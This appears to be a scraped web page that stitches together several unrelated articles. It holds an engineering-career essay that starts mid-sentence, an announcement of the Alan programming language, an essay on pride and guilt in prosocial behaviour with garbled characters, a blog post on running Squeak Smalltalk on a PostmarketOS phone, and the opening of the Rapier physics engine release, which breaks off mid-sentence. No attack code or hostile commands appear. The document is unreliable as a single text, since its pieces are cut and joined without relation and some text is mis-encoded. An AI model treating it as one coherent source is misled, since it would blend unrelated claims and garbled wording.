most of the information you’ll need is locked away. Did you ever see Sherlock Holmes using search engines? </p><figure><img src="https://lh3.googleusercontent.com/8zyhAq2HSKAYAzysnJfbR_m6ZCBloCL5jbUmlwLEnJnmErsiHzd6gOEPtMpJZIp961AlNxUrdloY4B3cFFpVca5iH7Xb3wJgj0rFG7TLO60IGey4TaOJGZITimTXGv7U9hXqh-Pp" alt=""></figure><p>There often is no single person who knows the answer you need. Five different people might hold five different pieces of the puzzle you’re assembling. And you don’t know who those five people are. And they don’t know which pieces you need.</p><p><em>You </em>have to find them. Find them and ask the right questions to sift through their brains, uncovering the nuggets you need.</p><h6 id="sifting-for-nuggets">Sifting for nuggets</h6><p>At Google Cloud Platform, customers would often contact the Technical Solutions Engineers for help when they ran into issues. Those TSEs dug into the problems and fixed them. </p><p>My manager had an idea: “Wouldn’t it be great if we could use AI to automate that process?” We had no clue how to do it. Didn’t even know if it was possible. Heck, we weren’t even sure what kind of problems customers were asking for help with. But that was the challenge my manager offered.</p><p>I accepted.</p><p>Now any AI solution for this kind of a problem requires lots of data. The AI needs to see many broken environments to understand what they look like. And as I searched around I realized we didn’t have that data, it was all locked away in the brains of those TSEs. You can’t train AI with that. </p><p>I had to find the patterns. Maybe chatting with the TSEs would reveal something...</p><p>Me: “So, what type of problem do you usually face?”</p><p>TSE: “Eh, it’s something different every time”</p><p>Darn it, The AI future was looking bleak. </p><p>Me: “Well, what do you do to solve it?”</p><p>TSE: “It depends. Based on the problem, we’ll query one database or another. Then that’ll point us somewhere else, and we keep digging until we find what’s wrong. Then we fix it.”</p><p>No solid data on what problems they solve. No repeatable way to fix them. I was ready to give up.</p><p>Wait a second.</p><p>“Tell me more about these queries you run?”</p><p>What if I changed the problem? Maybe I didn’t have to fix those customer issues right off the bat. What if I helped TSEs debug the problems faster? I could automatically run the hundreds of queries they might run and suggest “Hey, this one had a suspicious result. Maybe dig a bit deeper there?” That’s a lot of debugging the TSEs could avoid.</p><p>I could even extend this to collect the data needed for an actual an AI system. This had potential! The TSEs were excited. My team was excited. My manager was excited. We began coding.</p><h2 id="design-the-art-of-balance">Design: The Art of Balance</h2><p>With ambiguous problems there is no single right answer anymore. There might not be any answer. What you have is a pain point. It could be your customers’s pains, your team’s pains, or even your own pain. The existence of that pain is the problem. Your job is to remove that pain without introducing even greater pains.</p><p>There’s a funny thing about ambiguous problems: they don’t have a clear right answer. Every solution offers certain benefits and has certain downsides. The more of those you discover, the better you’ll be at balancing the tradeoffs you have to make. Some common trade offs to consider:</p><ul><li>How long will it take to develop the solution?</li><li>What’s the opportunity cost?</li><li>How risky is it? What happens if that thing fails?</li><li>How much work will it be to maintain this going forwards?</li><li>How far will it scale? How far does it need to?</li></ul><p>With these ambiguous problems, sometimes the best answer can be “keep doing the thing we’ve been doing.” That was a tough lesson to learn. </p><h6 id="young-and-naive">Young and Naive</h6><p>When I was a wee lad four years out of college, I had been asked to come up with a way to make our database upgrades less risky. The team would manually review all the planned changes to make sure they were safe, but once in a while a bug would slip though and the sound of pagers going off would fill the room as everyone frantically tried to fix it.</p><p>“Can we build a tool to catch those risky changes?” my manager asked me. Woah, this was a super open ended problem. Sweet! I was determined to not let him down. This required digging deep into database upgrade best practices (I even read a whole <a href="https://martinfowler.com/books/refactoringDatabases.html">book on it</a> cover to cover). I spent the winter holidays toiling away developing a prototype that could do upgrades safely. And it worked! Kinda.</p><p>When I showed my creation to my manager he was worried: “You know what, let’s just stick with doing things the way we do right now.” </p><p>Ouch. </p><p>It was a tough lesson on risk management, but he made the right call. A bug in my tool could have brought our entire service down. It wasn’t worth the risk.</p><figure><img src="https://lh6.googleusercontent.com/-SpPwF1sWOPZD0HnYx0IqqluusAVritix1g7_NToe3s93jEmkPTsYhCTHJdPh7axMdLIN6gZ0fJ1_01AiPDputH2wPnMBXTDmgfxYIFAicsQeyAlq8Y9fRTxBFljmx9FZYi1Pdcy" alt=""></figure><p>There were multiple lessons I learned that day:</p><ul><li>Consider how much risk any new project might add to the system</li><li>It’s okay to fail. If you never fail then you’re not stretching yourself</li><li>Get feedback early! </li></ul><p>To get that feedback communication is crucial. Tell people what you’re going to build before you build it and let them warn you about any pitfalls before you step into one. If I had shared that design with my manager before building it we would have cancelled the project weeks earlier. And I would have had a relaxing winter break.</p><p>But collecting feedback requires a soft skill: empathy.<strong> </strong>Can you understand why people disagree with you? What are they valuing differently?</p><p>You may not always agree with the feedback, but you have to understand it. Only then can you move forward with a new vision that everyone can get behind.</p><h2 id="build-consensus">Build Consensus</h2><p>Getting that feedback and agreeing on the plan grows more important as your projects get bigger.</p><p>You may start off just having to get your manager to agree (he’s the one who gave you that ambiguous task). But you’ll need to build consensus with the rest of your team and even people outside your team who have a stake in your work. </p><p>This requires communication skills, both to understand and be understood.</p><p>Once I was tasked with creating the next generation of our internal database management system. This was something many teams depended on, and our current solution would stop scaling a year or two down the line. My team had seven different people with eight different opinions about what the system should look like. That included my manager and skip level. Oy vey. </p><p>First step was talking to them all to really understand their concerns and priorities. But there was another voice I wanted to hear from: our customers! This was meant to be a system for other engineering teams, how could I build a solution for them without understanding their problems? &nbsp;It took a bit of digging to even figure out who those users were. This required another soft skill: The art of finding the person you need to talk to.</p><p>Eventually I got into a room with them. There they dropped the bombshell “We can’t really justify the work to migrate to any new system. The current one works well enough for us right now and we have more urgent problems to fix.” I talked to three different teams and got the same answer each time. Damn, what’s the point of building a solution if no one will use it?</p><p>A migration had to happen, soon the current system would stop meeting our reliability standards. There were a couple routes forwards:</p><ul><li><em>Politics</em>: Get my management chain to convince their management chain to force the teams to migrate. Yuck</li><li><em>Persuasion</em>: Teach those teams why this pain that they won’t feel for a few years is more important to fix than the pains they’re facing today. That’s a hard thing to prove, and we’d have to make this case to many, many teams. That doesn’t scale well</li></ul><p>There was a third option: change the constraints. What if I said ‘no’ to some of the features I’d been asked to add? Removing that let me design the system in a way that we could migrate all our customers automatically. There would be zero work required from them to migrate. We’d swap the engine with the car still zooming down the highway.</p><p>This was much more palatable. And by highlighting our user’s push back I convinced the other stakeholders to change drop those constraints as well.</p><figure><img src="https://lh5.googleusercontent.com/uQ8pUq_dwFP6BBDO1d66HKZNGs5DrxtbLCoKc0NxnrsvpHOlh_C_Pi9yUcoU7XLi9TiYkRKy_4QItN3s3pWBVlNCfm2MZYyECTrdEHaJsQVTVxqmV4GPVzEFXJaRxpS5wqloltjj" alt=""></figure><p>That’s the general flow of any project you work on at the senior levels: You research the problem, gather the pieces, understand the world better. You design a solution, collect feedback and adjust course as needed. Then the implementation begins.</p><p>So how do you learn all these skills? Experience. Jump out of the nest and flap your wings. If an opportunity shows up, take it. You won’t feel ready, no one does, but that’s what makes it a learning experience.</p><p>Ask for help. Listen to the answers you get. …</p></div></article></div>

<p><strong>14 August 2020 | David Ellis, Luis F. De Pombo</strong></p>
<p>We created a programming language to be able to write concurrent algorithms and business logic without having to explicitly program how it should be parallelized. Alan makes people more productive by managing IO and computational parallelism for them in the same way languages from the 90s like Java and Python made people more productive, when compared to C or C++, by managing memory for them.</p>
<p>Why the name? Alan is named in honor of Alan Turing. We find great inspiration in the magnitude of his intellectual contributions.</p>
<h4><a href="#implicit-parallelization-over-arrays-events-and-io" id="implicit-parallelization-over-arrays-events-and-io">Implicit parallelization over arrays, events and IO</a></h4>
<p>Alan is <a href="https://alan-lang.org/alan_overview.html#implicitly-parallel">implicitly parallel</a> because its compiler and runtime exploits opportunities for parallelization across the computing resources available without being told to do so. We have <a href="https://alan-lang.org/alan_overview.html#parallel-computation-and-the-problem-of-turing-completeness">constrained the language a bit</a> to provide better opportunities to do this. This results in nimbler codebases than those built with languages or frameworks that use parallel programming constructs such as threads, actors, channels, locks, futures, promises etc.</p>
<h4><a href="#no-race-conditions-and-fewer-runtime-errors" id="no-race-conditions-and-fewer-runtime-errors">No race conditions and fewer runtime errors</a></h4>
<p>Deadlocks, livelocks, undefined variables, divide-by-zero, integer under/overflow, array out-of-bounds access, etc, are not possible in Alan. Only out-of-memory errors persist, but they are impossible to avoid. This makes Alan codebases easier to maintain and develop in because <a href="https://alan-lang.org/alan_overview.html#statically-compiled-benefits-and-compile-time-safety">runtime errors are nearly always caught at compile time</a>.</p>
<h4><a href="#granular-third-party-permissions" id="granular-third-party-permissions">Granular third party permissions</a></h4>
<p>Alan's module resolution mechanism, with mocking built-in, allows you to <a href="https://alan-lang.org/alan_overview.html#third-party-module-permission-system">prevent specific third-party dependencies from having access to  specific standard libraries</a> that they should not have access to.</p>
<h4><a href="#no-gc-pauses" id="no-gc-pauses">No GC pauses</a></h4>
<p>Alan’s runtime manages memory allocation, access, and deallocation for you like Java, Python, or Javascript.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>Major global problems </strong>such as racial injustice or climate change often seem insurmountable. Itâ€™s hard to believe that our individual actions can make any real difference. Yet we know that many social dilemmas are overcome only through collective action. They call for people to make behavioural changes without any direct personal benefits â€“ in fact, these changes often come at a personal cost. So what might motivate people to adopt such a â€˜prosocialâ€™ mindset?</p>
<p>Researchers have explored a range of answers to this puzzle. A central line of enquiry relates to emotions and self-perception. Thereâ€™s a close link between emotions and behaviour: feelings motivate us to pursue goals, seek positive reinforcement and avoid punishment. But which emotional route is the most promising â€“ to make people feel bad about their shortcomings, or to encourage them to have a positive self-image because theyâ€™ve done â€˜the right thingâ€™?</p>
<p>There are good arguments both ways. Guilt can be a powerful motivator for action; the feeling of wanting to â€˜make upâ€™ for something can lead to reparative action. On the other hand, feeling good about our actions and what they reflect about who we are can elicit positive emotions. These feelings can then provide us with the energy and mental resources to engage in difficult problems, or to â€˜give to othersâ€™.</p>
<p>Itâ€™s important to distinguish here between guilt that arises internally, and guilt thatâ€™s externally induced. If we feel guilty about failing to recycle our plastics or adopt a vegetarian diet, we might be motivated to engage in reparative action. But if someone buttonholes us over dinner and tries to make us feel bad about our lifestyle choices, the picture might look very different; we might become defensive and try to justify our actions, which drives us further away from changing the way we behave. These scenarios then raise doubts about whether negative self-directed emotional appeals will be effective at promoting prosociality.</p>
<p>In a <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0188781">study</a> that my colleagues and I conducted at Columbia University in New York, we set out to test the consequences of positive versus negative self-directed emotions. Participants were prompted to think about either how guilty they felt about non-environmentally friendly behaviour, or how proud they might be for acting to preserve the environment. They were then asked a range of questions, such as whether they would pay increased rent to have more energy-efficient appliances, how likely they were to take public transport, and whether theyâ€™d be willing to use reusable shopping bags and mugs. Those participants who had been thinking of how proud they would feel about themselves chose to have a higher number of energy-efficient appliances compared with those participants who had been asked to think about personal guilt. Furthermore, participants in the pride group expressed higher intentions to engage in green behaviours compared with those in the guilt group. These findings suggest that inducing people to consider positive rather than negative self-directed emotions might recruit more people to a climate-change mitigation agenda, and to prosocial behaviour more broadly.</p>
<p>This potential advantage â€“ of appealing to positive emotions over negative ones â€“ links up with what we know about human self-perception. Having a positive self-image about who we are and what we do is a fundamental human need. When weâ€™re balanced and on good terms with ourselves, we are more energetic and have greater cognitive and emotional resources. By contrast, when we feel bad about ourselves, itâ€™s much more difficult to be prosocial â€“ especially if those feelings and actions arenâ€™t geared towards friends and family, but a removed, impersonal â€˜greater goodâ€™. Satisfying our important internal needs as emotional creatures can help us free up prosocial resources for others.</p>
<p>Research on self-affirmation supports this picture. In one <a href="https://academiccommons.columbia.edu/doi/10.7916/D84J1XJH">study</a>, we prompted one set of participants to engage in a self-affirming exercise. This involved reflecting on the values and behaviours that were important to them, and that they appreciated in themselves. Another group completed an unrelated exercise, describing the layout of the store at which they shop most frequently. This second â€˜controlâ€™ group allowed us to quantify the effect of the self-affirmation exercise.</p>
<p>Feeling good about ourselves can translate into acts of kindness towards others, for the benefit of society at large</p>
<p>Both groups were entered into a raffle to win a $10 bonus, and were given the option to either keep the money for themselves or to donate all or a portion to a selection of charities with varying missions and beneficiaries. The â€˜affirmationâ€™ group reported feeling more positively about themselves and more at peace with themselves â€“ and whatâ€™s more, these positive self-directed emotions translated into increased levels of charitable giving compared with those participants who had engaged in the unrelated exercise.</p>
<p><strong>My colleagues and</strong> I were curious about whether the effects of a positive self-image would extend to more challenging contexts, such as when the beneficiaries of prosociality were members of a marginalised group. In a field <a href="https://spssi.onlinelibrary.wiley.com/doi/full/10.1111/josi.12374">study</a> in Nigeria, we investigated how the public felt about enhanced social support for ex-prisoners. Like many other nations, Nigeria has high rates of recidivism. Social stigma means that those released from prison often struggle to secure jobs or have a supportive social network, which feeds into a cycle of reoffending. Interventions that reduce stigma and enhance social support can help ex-offenders to successfully reintegrate into society.</p>
<p>For the study, members of the general public in Nigeria were asked to engage in the self-affirming exercise prior to answering a range of survey questions. The results were striking. The self-affirmed participants showed more prosocial intentions and decreased discriminatory tendencies, compared with participants in the control group. They were more comfortable with having an ex-prisoner as their neighbour, for instance, and indicated stronger intentions to help an ex-prisoner whose employer was discriminating against them. They also expressed more willingness to invest personal time and effort to provide social support, such as participating in a tutoring programme for ex-prisoners.</p>
<p>Follow-up research in the United States replicated these results. Obtaining these findings in two studies and two different countries suggests that these effects can be generalised. The fact that a positive self-image can enhance prosociality doesnâ€™t seem to depend on a particular culture but could be an intrinsic part of human behaviour more generally. Feeling good about ourselves doesnâ€™t just enhance individual wellbeing by fulfilling a fundamental human psychological need; it can also translate into acts of kindness towards others, for the benefit of society at large.</p>
<p>A positive self-image can create a flywheel effect, in which the resulting prosocial behaviour sends a social signal to others. If others discriminate less, we are less likely to do so; if people in our social groups recycle more and watch their carbon footprint, we are more likely to do so. Getting a critical mass to â€˜join inâ€™ and acknowledging problems can, over time, help to shift norms â€“ which are drivers, not just inhibitors, of human behaviour.</p>
<p>The potential of positive self-directed emotions has largely not been embraced by activists. The worry could be that it might make those engaging in the cause appear self-satisfied or selfish. But these studies suggest that, instead of focusing on â€˜doom and gloomâ€™ messaging that zooms in on peopleâ€™s shortcomings and risks alienating them, policymakers and strategists might find that positive messaging, speaking to peopleâ€™s positive sense of self, might be a more powerful lever of behavioural change.</p></div></div></div>]]>

    <p>Back in 2007, when <a href="https://en.wikipedia.org/wiki/Openmoko">Openmoko</a>
was first a thing, I
<a href="https://leastfixedpoint.com/tonyg/kcbbs/openmoko-info.html">wrote an Erlang-based userland</a>
that got to the point of being able to take and make calls and receive
and send SMS. The project stalled: the Openmoko GTA01 was too slow,
its power-management too primitive, and Erlang’s GUI facilities too
rudimentary to make further work worthwhile.</p>

<p>Modern cellphone hardware is <em>much</em> more capable. Is it time to have
another run at the idea of a mobile personal computer?</p>

<h3 id="postmarketos-is-awesome">PostmarketOS is awesome</h3>

<p>Last week, I installed <a href="http://postmarketos.org/">PostmarketOS</a> on my
previous cellphone, a Samsung Galaxy S7 (using PostmarketOS’s
<a href="https://wiki.postmarketos.org/wiki/Samsung_Galaxy_S7_(samsung-herolte)">samsung-herolte</a>
configuration).</p>

<p>PostmarketOS turns out to be a beautifully engineered system that’s
easy to understand and modify. The basics of kernel and Alpine Linux
userland installed cleanly and easily on the phone, and it’s running
well as a development platform. I’m looking forward to getting into
PostmarketOS more deeply.</p>

<figure>
<p><a href="https://eighty-twenty.org/images/pm-htop-20200825.png"><img src="https://eighty-twenty.org/images/pm-htop-20200825.png" alt="htop running on my cellphone"></a>
<code>htop</code> running on my cellphone. Six cores!</p>
</figure>

<p>Running <code>htop</code> on the phone shows what an <em>amazing</em> little machine it
is! So much power. Loads of cores, lots of RAM. Plenty of space to
explore alternative visions of mobile personal computing.</p>

<p>However, the built-in demos, such as the
<a href="https://wiki.postmarketos.org/wiki/Weston">Weston</a> demo (shown above
at right), currently leave quite a bit to be desired. Perhaps some of
the other
<a href="https://wiki.postmarketos.org/wiki/User-Interfaces">user interface options</a>
included with PostmarketOS could get me closer to a day-to-day usable
cellphone - but I’m interested in running my own software! Let’s get
hacking.</p>

<h3 id="running-my-own-programs">Running my own programs</h3>

<p>PostmarketOS is a plain, clean Alpine Linux distribution. You can SSH
into it initially
<a href="https://wiki.postmarketos.org/wiki/USB_Network">via USB networking</a>.
From there, you can
<a href="https://wiki.postmarketos.org/wiki/WiFi#Using_NetworkManager">configure wifi using nmcli</a>,
set up SSH keys, and then access it directly using SSH over wifi.</p>

<figure>
<p><a href="https://eighty-twenty.org/images/postmarketos-samsung-galaxy-s7-herolte-20200825/IMG_20200825_213419.jpg"><img src="https://eighty-twenty.org/images/postmarketos-samsung-galaxy-s7-herolte-20200825/IMG_20200825_213419.jpg" alt="lflow: Framebuffer demo"></a>
<code>lflow</code>: Framebuffer demo</p>
</figure>

<p>Building software is just as simple:</p>

<figure><pre><code data-lang="shell"><span></span>apk add alpine-sdk</code></pre></figure>

<p>To experiment with drawing to the framebuffer and reading touchscreen
input via <code>/dev/input</code>, I compiled and ran an old
<a href="https://github.com/tonyg/mac-display-hacks/blob/a1fde2054f00588076218b76d7ecf34764e5f99e/lflow.c">quick and dirty framebuffer hack</a>
I wrote years ago. The results (shown at left) were encouraging: the
program effortlessly animates tens of thousands of points at 30 frames
per second, responding to touch inputs. Display is via brute-force
pixel output to the <code>mmap</code>‘d frame buffer. It doesn’t even use a full
core.</p>

<p>PostmarketOS turns a phone into a fully capable Linux machine, with
total control over the attached hardware, and with everything
accessible to the developer in the usual places using the usual tools.</p>

<p>But Unix tools are inappropriate for a mobile personal computing
platform. We’ll need something else.</p>

<h3 id="a-smalltalk-phone">A Smalltalk phone</h3>

<figure>
<p><a href="https://eighty-twenty.org/images/postmarketos-samsung-galaxy-s7-herolte-20200825/IMG_20200825_213500.jpg"><img src="https://eighty-twenty.org/images/postmarketos-samsung-galaxy-s7-herolte-20200825/IMG_20200825_213500.jpg" alt="Squeak Smalltalk on PostmarketOS"></a>

</figure>

<p>Smalltalk could make an ideal basis for a mobile personal computing
platform.</p>

<p>I’ve <a href="https://eighty-twenty.org/tag/smalltalk">enjoyed</a> using,
developing with, and contributing to the
<a href="https://squeak.org/">Squeak Smalltalk</a> implementation since the mid
’00s.</p>

<p>So I compiled the
<a href="https://github.com/OpenSmalltalk/opensmalltalk-vm">Cog Smalltalk VM</a>
on the phone itself, making use of the 64-bit ARM support code that
landed extremely recently.</p>

<p>And lo and behold, it runs! Shown to the right is a bleeding-edge,
fully up-to-date Squeak 6.0-alpha image running on the phone itself.

<p>From here, I can experiment with new ideas using the full power of a
modern Smalltalk environment.</p>

<h3 id="what-next">What next?</h3>

<p>My previous Openmoko experiments foundered, in part, on the GUI aspect
of the system; GTK+ via Erlang was fine for quick prototyping but
wasn’t really up to the task for a day-to-day usable machine.</p>

<p>I recall getting Squeak running on my GTA01, in order to see if it
could provide a viable UI. However, I remember being stymied by the
mismatch between the expectations of the Smalltalk environment and the
realities of the phone.</p>

<p>Squeak wants a mouse and keyboard. It assumes a monitor-sized display,
in everything from widget and font sizes to window management. To work
well on a phone, it needs a touchscreen-based, high-DPI UI in addition
to its existing toolset.</p>

<p>Smalltalk, in both its language aspect and its system design aspect,
also <a href="https://eighty-twenty.org/2011/05/08/weaknesses-of-smalltalk-strengths-of-erlang">suffers from some weaknesses in areas where Erlang shines</a>.</p>

<p>However, in the years since the GTA01:</p>

<ul>
  <li>
    <p>the hardware is much better,</p>
  </li>
  <li>
    <p>the Squeak VM and image are better,</p>
  </li>
  <li>
    <p>I’ve learned a heck of a lot about
<a href="https://syndicate-lang.org/tonyg-dissertation/html/">some good ways to design interactive systems</a>,
and</p>
  </li>
  <li>
    <p>I’ve recently
<a href="https://tonyg.github.io/squeak-actors/">built some tools that help bring Erlang- and Syndicate-style architectural patterns for concurrency to Smalltalk</a>.</p>
  </li>
</ul>

<p>So I think using Erlang/Syndicate-style
<a href="https://tonyg.github.io/squeak-actors/">Actors</a> to structure a
Smalltalk-based phone userland, perhaps with <code>cgroups</code>-based
sub-virtual-machines and images, could work well.</p>

<p>My initial experiments have concentrated on</p>

<ul>
  <li>
    <p>fixing the tiny fonts (the DPI-change support code in the image
needs work, and the support in the VM seems to be absent (?)),</p>
  </li>
  <li>
    <p>reading from the touchscreen (probably
<a href="http://lists.squeakfoundation.org/pipermail/squeak-dev/2016-June/190051.html">like this</a>),</p>
  </li>
  <li>
    <p>thinking about how to structure Actor supervision hierarchies and
<a href="https://syndicate-lang.org/tonyg-dissertation/html/#sec:Syndicate's-approach-to-concurrency">Dataspaces</a>
for a mobile phone (probably borrowing some design elements from my
earlier
<a href="https://github.com/tonyg/erlang-openmoko">Openmoko Erlang-based userland</a>),
and</p>
  </li>
  <li>
    <p>thinking about how to layer a touchscreen (panel-based?) GUI atop
Squeak’s <a href="http://wiki.squeak.org/squeak/morphic">Morphic</a> UI.</p>
  </li>
</ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>In our announcement last week, we briefly mentioned this new physics engine we have been working on during the past 5 months.
Today we are officially releasing it for the first time: the project <a href="https://rapier.rs/" target="_blank" rel="noopener noreferrer"><strong>Rapier</strong></a>; a set of two 100%
rust libraries <strong>rapier2d</strong> and <strong>rapier3d</strong> for 2D and 3D physics simulations for games, animation, and robotics.</p><p><img src="https://www.dimforge.com/img/rapier_logo_color_textpath_dark.svg" alt="rapier logo"></p><p>This post will be quite long, so here are all the different sections:</p><ul><li><a href="#presenting-rapier">Presenting Rapier</a></li><li><a href="#reaching-out-to-other-communities-bevy-and-javascript">Reaching out to other communities: Bevy and JavaScript</a></li><li><a href="#feature-comparison-with-nphysics">Feature comparison with nphysics</a></li><li><a href="#benchmarks">Benchmarks</a><ul><li><a href="#3d-benchmark-rapier-vs-physx-vs-nphysics">3D Benchmark: Rapier vs. PhysX vs. nphysics</a></li><li><a href="#3d-benchmark-conclusion">3D Benchmark: Conclusion</a></li><li><a href="#2d-benchmark-rapier-vs-box2d-vs-nphysics">2D Benchmark: Rapier vs. Box2D vs. nphysics</a></li><li><a href="#2d-benchmark-conclusion">2D Benchmark: Conclusion</a></li><li><a href="#running-the-benchmarks-yourself">Running the benchmarks yourself</a></li></ul></li><li><a href="#conclusion">Conclusion</a></li></ul><h3>Presenting Rapier</h3><p><strong>Rapier</strong> is the successor of <a href="https://nphysics.org/" target="_blank" rel="noopener noreferrer">nphysics</a> and focuses on performance first.
Just like <strong>nphysics</strong> it is split into two crates: <strong>rapier2d</strong> and <strong>rapier3d</strong> for 2D and 3D physics respectively. It
is designed to be fast and multithreaded right from the beginning. It is also designed to require less incremental compilation
times because the data structures it defines are not generic.</p><p>In release mode, <strong>Rapier</strong> runs 5 to 8 times faster than <strong>nphysics</strong> , making it close to the performance of (the CPU version of) NVidia PhysX
and slightly faster than Box2D as you will see in the <a href="#benchmarks">benchmark sections</a>. <strong>Rapier</strong> is only at its beginning, so many features
are still missing. However some performance optimizations like parallelism, and SIMD have been integrated right from the start.</p><p>There already are a few key features that makes Rapier stand out. Since they may affect compilation times and/or performance,
they are disabled by default and need to be enabled explicitly through cargo features:</p><ol><li><strong>Serialization</strong>: if the <code>serde-serialize</code> feature of <strong>Rapier</strong> is enabled, every physics component will be serializable using <code>serde</code>.
This means that you can take a deep snapshot of the physics state and restore it later. This snapshot can even be saved on
disk or sent through network.</li><li><strong>Cross-platform determinism</strong>: if the <code>enhanced-determinism</code> feature of <strong>Rapier</strong> is enabled, it will behave in
a <em>bit-level cross-platform deterministic</em> way in all platforms that comply with the IEEE 754-2008 floating point standard.
This means that if you run the same simulation with the same initial states on two different machines (or browsers)
you will get the exact same results. Here "bit-level" determinism means that if you serialize the physics state after the
same number of timesteps on two different machines, you will obtain the exact same byte array for both: you may compute a checksum
of both snapshots and they will be identical. All this doesn't apply to platforms with pointer size smaller than 32-bit, and on
platforms that don't comply to IEEE&nbsp;754-2008 strictly.</li></ol><p>See <a href="#feature-comparison-with-nphysics">that section</a> for a comparison between Rapier and nphysics features.</p><h3>Reaching out to other communities: Bevy and JavaScript</h3><p><img src="https://www.dimforge.com/img/bevy_wasm_js.svg" alt="Bevy WASM JS"></p><p>Writing a physics engine is hard. There are not a lot of choices out there and most of them are written in C++. With
<strong>nphysics</strong> we wanted to provide an open-source 100% rust physics solution for the Rust community.
With <strong>Rapier</strong> we want to go one step further by contributing to as many communities in need of a physics engine as we can. This is why we are
starting, right at the beginning of the <strong>Rapier</strong> story, by providing:</p><ul><li>Official <strong>JavaScript bindings</strong> for the WASM version of <strong>Rapier</strong>. These binding are generated using <code>wasm_bindgen</code> and
are published to NPM as the packages <a href="https://www.npmjs.com/package/@dimforge/rapier3d" target="_blank" rel="noopener noreferrer">@dimforge/rapier3d</a> and
<a href="https://www.npmjs.com/package/@dimforge/rapier2d" target="_blank" rel="noopener noreferrer">@dimforge/rapier2d</a>. While multiple physics solutions already exist
for JavaScript they are either slow (because they are manually written in JS like <strong>cannon.js</strong> or <strong>oimo.js</strong>), or not
officially maintained by their original developers (because they are ported from C++ using Emscripten, like <strong>box2d.wasm</strong>,
<strong>ammo.wasm</strong>, or <strong>physx.wasm</strong>). By providing official wasm builds and JS bindings, we are making sure to provide the
best support, documentation, and continuous updates to the JS community.</li><li>Official <strong>plugins for the <a href="https://bevyengine.org/" target="_blank" rel="noopener noreferrer">Bevy</a></strong> game engine. They are available as the
<a href="https://crates.io/crates/bevy_rapier2d" target="_blank" rel="noopener noreferrer">bevy_rapier2d</a> and <a href="https://crates.io/crates/bevy_rapier3d" target="_blank" rel="noopener noreferrer">bevy_rapier3d</a>
crates. The <strong>Bevy</strong> game engine has recently been released as an efficient, fast-to-compile, and easy to use, data-oriented
game engine. It is still at its early state and is lacking any physics feature. We believe physics support is a very high-value
feature to have in a game engine. By providing official plugins we want to make sure the <strong>Bevy</strong> community can benefit from the
<strong>Rapier</strong> physics engines quickly and easily.</li></ul><p>There are so many more communities we would like to contribute to but don't have manpower to support all of them just now.
Other integrations and languages will come in the future.</p><p>We also plan to create official plugins for the <strong>Amethyst</strong> game engine but have not started yet. We are waiting
for the migration of <strong>Amethyst</strong> to the <a href="https://crates.io/crates/legion" target="_blank" rel="noopener noreferrer">legion</a> ECS solution before starting to work
on this.</p><div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</h5></p><p>Examples using the 2D JS bindings are available on GitHub:

Our first goal during the next few months is to bring <strong>Rapier</strong> at the
same level as <strong>nphysics</strong> featurewise, while keeping the significant performance improvements and better accuracy.</p><h3>Benchmarks</h3><p>Alright, we claimed that <strong>Rapier</strong> is nearly as fast as the CPU version of PhysX, 5 to 10 times faster than nphysics, and
slightly faster than Box2D. It is now time to prove these claims using benchmarks.</p><div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</h5></p><p>Keep in mind that <strong>Rapier</strong> is still at a early development stage. It does not have as many features as the ofther
physics engines involved in this benchmark. However, our objective is to ensure that the future addition of new features
to <strong>Rapier</strong> don't reduce the level of perfomance you see here.</p></div><p>In the subsequent benchmarks we ran a set of stress tests using four different physics engines:</p><ol><li><strong>Rapier</strong> using our <a href="https://crates.io/crates/rapier3d" target="_blank" rel="noopener noreferrer">rapier3d</a> crate for 3D and <a href="https://crates.io/crates/rapier2d" target="_blank" rel="noopener noreferrer">rapier2d</a> for 2D.</li><li><strong>PhysX 4</strong> using the <a href="https://crates.io/crates/physx" target="_blank" rel="noopener noreferrer">physx</a> crate.</li><li><strong>Box2d</strong> using the <a href="https://crates.io/crates/wrapped2d" target="_blank" rel="noopener noreferrer">wrapped2d</a> crate.</li><li><strong>nphysics</strong> using our <a href="https://crates.io/crates/nphysics3d" target="_blank" rel="noopener noreferrer">nphysics3d</a> crate for 3D and <a href="https://crates.io/crates/nphysics2d" target="_blank" rel="noopener noreferrer">nphysics2d</a> for 2D</li></ol><p>Independently of the chosen physics engine, all scenes are always initialized in the
exact same way (same bodies, same colliders at the same initial positions) and with the following
